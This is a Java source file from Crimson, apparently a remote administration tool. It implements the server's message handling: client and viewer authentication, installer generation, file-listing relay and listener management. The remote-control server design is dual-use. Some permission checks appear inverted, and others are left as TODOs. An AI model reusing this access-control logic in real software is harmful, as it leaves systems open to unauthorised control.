/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server.net;

import java.util.Date;
import java.util.concurrent.TimeUnit;

import org.slf4j.Logger;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.core.Common.Instance;
import com.subterranean_security.crimson.core.net.BasicExecutor;
import com.subterranean_security.crimson.core.net.ConnectionState;
import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
import com.subterranean_security.crimson.core.proto.ClientAuth.MI_AuthRequest;
import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
import com.subterranean_security.crimson.core.proto.Delta.EV_ViewerProfileDelta;
import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
import com.subterranean_security.crimson.core.proto.Listener.RS_AddListener;
import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
import com.subterranean_security.crimson.core.proto.Login.RS_Login;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.State.RS_ChangeServerState;
import com.subterranean_security.crimson.core.proto.Stream.Param;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.Crypto;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.server.Generator;
import com.subterranean_security.crimson.server.Server;
import com.subterranean_security.crimson.server.ServerState;
import com.subterranean_security.crimson.server.ServerStore;
import com.subterranean_security.crimson.server.stream.SInfoSlave;
import com.subterranean_security.crimson.sv.Listener;
import com.subterranean_security.crimson.sv.PermissionTester;
import com.subterranean_security.crimson.sv.ViewerProfile;

import io.netty.util.ReferenceCountUtil;

public class ServerExecutor extends BasicExecutor {
	private static final Logger log = CUtil.Logging.getLogger(ServerExecutor.class);

	private Receptor receptor;

	public ServerExecutor(Receptor r) {
		receptor = r;

		ubt = new Thread(new Runnable() {
			public void run() {
				while (!Thread.interrupted()) {
					Message m;
					try {
						m = receptor.uq.take();
					} catch (InterruptedException e) {
						return;
					}
					if (m.hasEvProfileDelta()) {

						profileDelta(m);
					}

					ReferenceCountUtil.release(m);
				}
			}
		});
		ubt.start();

		nbt = new Thread(new Runnable() {
			public void run() {
				while (!Thread.interrupted()) {
					Message m;
					try {
						m = receptor.nq.take();
					} catch (InterruptedException e) {
						return;
					}
					if (m.hasCid() && m.getCid() != 0) {
						// route
						log.debug("Routing message (CVID: {})", m.getCid());
						try {
							ServerStore.Connections.getConnection(m.getCid()).handle.write(m);
						} catch (NullPointerException e) {
							log.debug("Could not forward message (CVID: {})", m.getCid());
						}
					} else if (m.hasRqLogin()) {
						new Thread(new Runnable() {
							public void run() {
								login_rq(m);
							}
						}).start();

					} else if (m.hasRqGenerate()) {
						generate_rq(m);
					} else if (m.hasRqGroupChallenge()) {
						challenge_rq(m);
					} else if (m.hasMiAuthRequest()) {
						auth_1w(m);
					} else if (m.hasMiChallengeresult()) {
						challengeResult_1w(m);
					} else if (m.hasRqFileListing()) {
						file_listing_rq(m);
					} else if (m.hasRsFileListing()) {
						file_listing_rs(m);
					} else if (m.hasMiStreamStart()) {
						stream_start_ev(m);
					} else if (m.hasMiStreamStop()) {
						stream_stop_ev(m);
					} else if (m.hasRqAddListener()) {
						rq_add_listener(m);
					} else if (m.hasRqChangeServerState()) {
						rq_change_server_state(m);
					} else if (m.hasRqChangeClientState()) {
						rq_change_client_state(m);
					} else {
						receptor.cq.put(m.getId(), m);
					}

					ReferenceCountUtil.release(m);
				}
			}
		});
		nbt.start();
	}

	private void challengeResult_1w(Message m) {
		if (receptor.getState() != ConnectionState.AUTH_STAGE2) {
			return;
		}
		if (m.getMiChallengeresult().getResult()) {
			acceptClient();
		} else {
			log.debug("Authentication failed");
			receptor.setState(ConnectionState.CONNECTED);
		}

	}

	private void auth_1w(Message m) {
		if (receptor.getState() != ConnectionState.CONNECTED) {
			return;
		} else {
			receptor.setState(ConnectionState.AUTH_STAGE1);
		}
		MI_AuthRequest auth = m.getMiAuthRequest();
		if (auth.getCvid() != 0) {
			receptor.setCvid(auth.getCvid());
		} else {
			ServerCommands.setCvid(receptor, IDGen.getCvid());
		}

		switch (auth.getType()) {

		case GROUP:
			final Group group = ServerStore.Authentication.getGroup(auth.getGroupName());
			if (group == null) {
				log.debug("Authentication failed: Invalid Group: {}", auth.getGroupName());
				receptor.setState(ConnectionState.CONNECTED);
				return;
			}
			final int id = IDGen.get();

			final String magic = CUtil.Misc.randString(64);
			RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
			receptor.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());

			new Thread(new Runnable() {
				public void run() {
					try {
						RS_GroupChallenge rs = receptor.cq.take(id, 7, TimeUnit.SECONDS).getRsGroupChallenge();
						boolean flag = rs.getResult().equals(Crypto.sign(magic, group.getKey()));
						if (flag) {
							receptor.setState(ConnectionState.AUTH_STAGE2);
						} else {
							log.info("Challenge 1 failed");
							receptor.setState(ConnectionState.CONNECTED);
						}
						receptor.handle.write(Message.newBuilder().setId(id)
								.setMiChallengeresult(MI_GroupChallengeResult.newBuilder().setResult(flag).build())
								.build());
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						log.debug("Failed to get challenge from client");
					}
				}
			}).start();

			break;

		case PASSWORD:
			if (!ServerStore.Authentication.tryPassword(auth.getPassword())) {
				log.debug("Authentication failed");
				receptor.setState(ConnectionState.CONNECTED);
				break;
			}
		case NO_AUTH:
			// come on in
			acceptClient();
			break;
		default:
			break;

		}

	}

	private void acceptClient() {
		receptor.setState(ConnectionState.AUTHENTICATED);
		receptor.setInstance(Instance.CLIENT);
		ServerStore.Connections.add(receptor);
	}

	private void challenge_rq(Message m) {
		if (receptor.getState() != ConnectionState.AUTH_STAGE2) {
			return;
		}
		RQ_GroupChallenge rq = m.getRqGroupChallenge();
		Group group = ServerStore.Authentication.getGroup(rq.getGroupName());

		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(Crypto.sign(rq.getMagic(), group.getKey()))
				.build();
		receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void profileDelta(Message m) {
		if (m.hasVid()) {
			ServerStore.Connections.getConnection(m.getVid()).handle.write(m);
		} else {
			// TODO send original message when pd needs no modification
			EV_ProfileDelta pd = m.getEvProfileDelta();
			if (pd.hasExtIp()) {
				if (pd.getExtIp().equals("0.0.0.0") && !receptor.getRemoteAddress().equals("127.0.0.1")) {
					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setExtIp(receptor.getRemoteAddress()).build();
				}
			}
			for (int svid : ServerStore.Connections.getKeySet()) {
				Receptor r = ServerStore.Connections.getConnection(svid);
				// somehow check permissions TODO

				if (r.getInstance() == Instance.VIEWER) {
					r.handle.write(Message.newBuilder().setUrgent(true).setEvProfileDelta(pd).build());

				}
			}
		}

	}

	private void login_rq(Message m) {
		receptor.setInstance(Instance.VIEWER);

		String user = m.getRqLogin().getUsername();
		EV_ServerProfileDelta.Builder sid = EV_ServerProfileDelta.newBuilder();
		EV_ViewerProfileDelta.Builder vid = EV_ViewerProfileDelta.newBuilder();

		boolean pass = false;
		try {
			if (!ServerState.exampleMode) {
				pass = false;
				if (m.getRqLogin().getSvid() != 0) {
					receptor.setCvid(m.getRqLogin().getSvid());
				} else {
					ServerCommands.setCvid(receptor, IDGen.getCvid());
				}

				if (!ServerStore.Databases.system.userExists(user)) {
					pass = false;
					return;
				}
				RQ_LoginChallenge.Builder lcrq = RQ_LoginChallenge.newBuilder()
						.setSalt(ServerStore.Databases.system.getSalt(user));
				receptor.handle.write(Message.newBuilder().setId(m.getId()).setRqLoginChallenge(lcrq).build());
				Message lcrs = null;
				try {
					lcrs = receptor.cq.take(m.getId(), 5, TimeUnit.SECONDS);
					log.debug("Received login challenge response: {}", lcrs.getRsLoginChallenge().getResult());
				} catch (InterruptedException e) {
					log.error("No response to login challenge");
					pass = false;
					return;
				}
				pass = ServerStore.Databases.system.validLogin(m.getRqLogin().getUsername(),
						lcrs.getRsLoginChallenge().getResult());
			} else {
				pass = true;
				receptor.setCvid(IDGen.getCvid());
				user = "user_" + Math.abs(CUtil.Misc.rand());
			}

			if (pass) {
				log.debug("Accepting Login");
				receptor.setState(ConnectionState.AUTHENTICATED);
				ViewerProfile vp = null;
				try {
					vp = ServerStore.Profiles.getViewer(receptor.getCvid());
				} catch (Exception e1) {
					ServerStore.Profiles.updateCvid(user, receptor.getCvid());
					
					try {
						vp = ServerStore.Profiles.getViewer(receptor.getCvid());
					} catch (Exception e2) {
						
						vp = new ViewerProfile(receptor.getCvid());
						vp.setUser(user);
						ServerStore.Profiles.addViewer(vp);
					}
				}
				ServerStore.Connections.add(receptor);

				vp.setIp(receptor.getRemoteAddress());
				vid.setIp(vp.getIp());

				String lastIP = vp.getLastLoginIp();
				if (lastIP != null) {
					vid.setLastIp(lastIP);
				}
				Date lastTime = vp.getLastLoginTime();
				if (lastTime != null) {
					vid.setLastLogin(lastTime.getTime());
				}

				for (Listener l : ServerStore.Listeners.listeners) {
					sid.addListeners(l.getConfig());
				}
				sid.setServerStatus(Server.isRunning());
			}

		} finally {
			receptor.handle.write(Message.newBuilder().setId(m.getId())
					.setRsLogin(RS_Login.newBuilder().setResponse(pass).setSpd(sid).setVpd(vid)).build());
			log.info("Login outcome: " + pass);
			if (!pass) {
				receptor.close();
			}
		}
	}

	private void generate_rq(Message m) {

		byte[] res = null;
		Generator g = null;
		try {
			g = new Generator(m.getRqGenerate().getInternalConfig());
			res = g.getResult();
		} catch (Exception e) {
			log.info("Could not generate installer");
			e.printStackTrace();

			GenReport.Builder gr = GenReport.newBuilder();
			gr.setResult(false).setGenTime(0).setComment("An unexpected error has occured");
			RS_Generate.Builder rs = RS_Generate.newBuilder().setReport(gr.build());
			receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
			return;
		}
		RS_Generate.Builder rs = RS_Generate.newBuilder().setInstaller(ByteString.copyFrom(res))
				.setReport(g.getReport());
		receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
	}

	private void file_listing_rq(Message m) {
		ViewerProfile vp = null;
		try {
			vp = ServerStore.Profiles.getViewer(m.getVid());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		if (m.hasCid()) {
			if (PermissionTester.verifyClientPermission(vp.getPermissions(), m.getCid(), "server_fs_read")) {
				System.out.println("Permissions error");
				return;
			}
			Receptor r = ServerStore.Connections.getConnection(m.getCid());
			r.handle.write(m);

		} else {
			if (PermissionTester.verifyServerPermission(vp.getPermissions(), "server_fs_read")) {
				System.out.println("Permissions error");
				return;
			}
			receptor.handle.write(Message.newBuilder().setRsFileListing(RS_FileListing.newBuilder().addAllListing(null))
					.setVid(m.getVid()).build());
		}

	}

	private void file_listing_rs(Message m) {
		Receptor r = ServerStore.Connections.getConnection(m.getVid());
		r.handle.write(m);
	}

	private void stream_start_ev(Message m) {

		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new SInfoSlave(p));
		}

	}

	private void stream_stop_ev(Message m) {

		StreamStore.removeStream(m.getMiStreamStop().getStreamID());

	}

	private void rq_add_listener(Message m) {
		log.debug("Executing: rq_add_listener");
		// TODO check permissions
		receptor.handle
				.write(Message.newBuilder().setRsAddListener(RS_AddListener.newBuilder().setResult(true)).build());
		ServerStore.Listeners.listeners.add(new Listener(m.getRqAddListener().getConfig()));
		Message update = Message.newBuilder().setUrgent(true).setEvServerProfileDelta(
				EV_ServerProfileDelta.newBuilder().addListeners(m.getRqAddListener().getConfig())).build();
		ServerStore.Connections.sendToAll(Instance.VIEWER, update);

	}

	private void rq_change_server_state(Message m) {
		log.debug("Executing: rq_change_server_state");
		// TODO check permissions
		String comment = "";
		boolean result = true;

		receptor.handle.write(Message.newBuilder().setId(m.getId())
				.setRsChangeServerState(RS_ChangeServerState.newBuilder().setResult(result).setComment(comment))
				.build());
		Server.setState(m.getRqChangeServerState().getNewState());
	}

	private void rq_change_client_state(Message m) {
		log.debug("Executing: rq_change_client_state");
	}

}
